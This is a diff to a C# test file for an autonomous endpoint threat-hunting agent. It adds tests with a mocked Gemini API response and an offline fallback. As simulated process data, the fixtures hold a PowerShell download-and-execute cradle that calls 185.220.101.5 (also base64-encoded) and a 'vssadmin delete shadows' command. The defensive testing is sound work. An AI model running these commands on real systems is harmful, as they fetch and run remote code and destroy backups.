@@ -1,4 +1,7 @@
+using System.Net;
+using System.Net.Http;
 using System.Text;
+using System.Text.Json;
 using Phalanx.Cockpit.Agent;
 using Phalanx.Cockpit.CQRS;
 using Phalanx.Cockpit.Storage;
@@ -13,7 +16,7 @@ public class AutonomousHunterAgentTests
     [Fact]
     public async Task TestAutonomousInvestigationOnSuspendedProcess()
     {
-        // 1. 컴포넌트 셋업
+        // 1. 컴포넌트 셋업 (명시적 null 주입으로 환경변수 영향 없는 오프라인 모드 격리)
         var treeManager = new ProcessTreeProjectionManager();
         var archiveManager = ForensicArchiveManager.CreateInMemory();
 
@@ -26,7 +29,7 @@ public class AutonomousHunterAgentTests
             new SystemFirewallTool()
         };
 
-        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
 
         // 2. 부모 프로세스(winword.exe) 및 동결된 자식 프로세스(powershell.exe) 트리에 적재
         string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
@@ -106,5 +109,193 @@ public class AutonomousHunterAgentTests
 
         var savedTraces = archiveManager.GetTracesForIncident(result.IncidentId);
         Assert.Equal(result.Traces.Count, savedTraces.Count);
+    }
+
+    [Fact]
+    public async Task TestGeminiLiveModeWithMockHttp()
+    {
+        // 1. 모의 Gemini 2.0 Flash REST 응답 구성
+        string decisionJson = """
+        {
+          "thought": "오피스 매크로 winword.exe가 powershell.exe를 기동하여 인라인 다운로더를 실행하고 있으므로 DecodePayloadTool을 호출하여 C2를 해독해야 합니다.",
+          "action_tool": "DecodePayloadTool",
+          "action_args": {},
+          "is_final_verdict": true,
+          "verdict_action": "ACTION_KILL",
+          "confidence_score": 0.99,
+          "summary_title": "Gemini 2.0 Flash: 파일리스 C2 다운로더 침투 실시간 탐지",
+          "narrative": "Gemini 2.0 Flash 실시간 수사 결과, winword.exe에 의해 기동된 powershell.exe 프로세스가 악성 C2와 통신하려는 시도가 확증되었습니다. 즉각 사살(ACTION_KILL)을 집행합니다.",
+          "mitre_tactics": ["T1566.001", "T1059.001"]
+        }
+        """;
+
+        string geminiResponseJson = $$"""
+        {
+          "candidates": [
+            {
+              "content": {
+                "role": "model",
+                "parts": [
+                  {
+                    "text": {{JsonSerializer.Serialize(decisionJson)}}
+                  }
+                ]
+              },
+              "finishReason": "STOP"
+            }
+          ],
+          "usageMetadata": {
+            "promptTokenCount": 120,
+            "candidatesTokenCount": 85,
+            "totalTokenCount": 205
+          }
+        }
+        """;
+
+        var mockHandler = new MockHttpMessageHandler(req =>
+        {
+            Assert.Contains("generativelanguage.googleapis.com", req.RequestUri?.Host);
+            Assert.Contains("key=test-api-key", req.RequestUri?.Query);
+            return new HttpResponseMessage(HttpStatusCode.OK)
+            {
+                Content = new StringContent(geminiResponseJson, Encoding.UTF8, "application/json")
+            };
+        });
+
+        var mockHttpClient = new HttpClient(mockHandler);
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        var agent = new AutonomousHunterAgent(
+            treeManager,
+            archiveManager,
+            tools,
+            geminiApiKey: "test-api-key",
+            httpClient: mockHttpClient
+        );
+
+        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
+        string fullCmd = $"powershell.exe -enc {b64}";
+
+        treeManager.ApplySnapshotBatch(new[]
+        {
+            new ProcessEvent
+            {
+                ProcessId = 3104,
+                ImageName = "winword.exe",
+                Lifecycle = ProcessLifecycle.LifecycleSnapshot
+            }
+        });
+
+        treeManager.ApplyDeltaEvent(new ProcessEvent
+        {
+            ProcessId = 8492,
+            ParentProcessId = 3104,
+            ImageName = "powershell.exe",
+            CommandLine = fullCmd,
+            IsSuspended = true,
+            Lifecycle = ProcessLifecycle.LifecycleSuspended
+        });
+
+        var targetNode = treeManager.FindActiveNodeByPid(8492);
+        Assert.NotNull(targetNode);
+
+        var dispatchedCommands = new List<MitigationCommand>();
+
+        // 2. 실행
+        var result = await agent.InvestigateAsync(targetNode, cmd =>
+        {
+            dispatchedCommands.Add(cmd);
+            return Task.CompletedTask;
+        });
+
+        // 3. 검증
+        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
+        Assert.True(result.Confidence >= 0.95);
+        Assert.Contains("Gemini 2.0 Flash", result.SummaryTitle);
+        Assert.Contains("Gemini 2.0 Flash", result.Narrative);
+        Assert.Contains("T1566.001", result.MitreTactics);
+
+        // LiteDB 저장 확인
+        var saved = archiveManager.GetIncident(result.IncidentId);
+        Assert.NotNull(saved);
+        Assert.Equal(result.IncidentId, saved.IncidentId);
+    }
+
+    [Fact]
+    public async Task TestGeminiFallbackToOfflineOnNetworkFailure()
+    {
+        // 네트워크 단절 시 예외를 던지는 모의 핸들러
+        var failingHandler = new MockHttpMessageHandler(_ =>
+        {
+            throw new HttpRequestException("DNS Resolution Failure (Simulated offline network)");
+        });
+
+        var failingHttpClient = new HttpClient(failingHandler);
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        // API Key는 지정되어 있으나 네트워크가 죽어있는 환경
+        var agent = new AutonomousHunterAgent(
+            treeManager,
+            archiveManager,
+            tools,
+            geminiApiKey: "test-api-key",
+            httpClient: failingHttpClient
+        );
+
+        string rawScript = "vssadmin delete shadows /all /quiet";
+        treeManager.ApplyDeltaEvent(new ProcessEvent
+        {
+            ProcessId = 9999,
+            ParentProcessId = 0,
+            ImageName = "vssadmin.exe",
+            CommandLine = rawScript,
+            IsSuspended = true,
+            Lifecycle = ProcessLifecycle.LifecycleSuspended
+        });
+
+        var targetNode = treeManager.FindActiveNodeByPid(9999);
+        Assert.NotNull(targetNode);
+
+        // 실행: 예외 없이 오프라인 엔진으로 즉각 폴백되어야 함
+        var result = await agent.InvestigateAsync(targetNode);
+
+        // 검증: 오프라인 결정론적 엔진에 의해 정상 사살 판결 도출 확인
+        Assert.NotNull(result);
+        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
+        Assert.True(result.Elapsed.TotalSeconds < 3.0);
+    }
+
+    private class MockHttpMessageHandler : HttpMessageHandler
+    {
+        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;
+
+        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
+        {
+            _handler = handler;
+        }
+
+        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
+        {
+            return Task.FromResult(_handler(request));
+        }
     }
 }
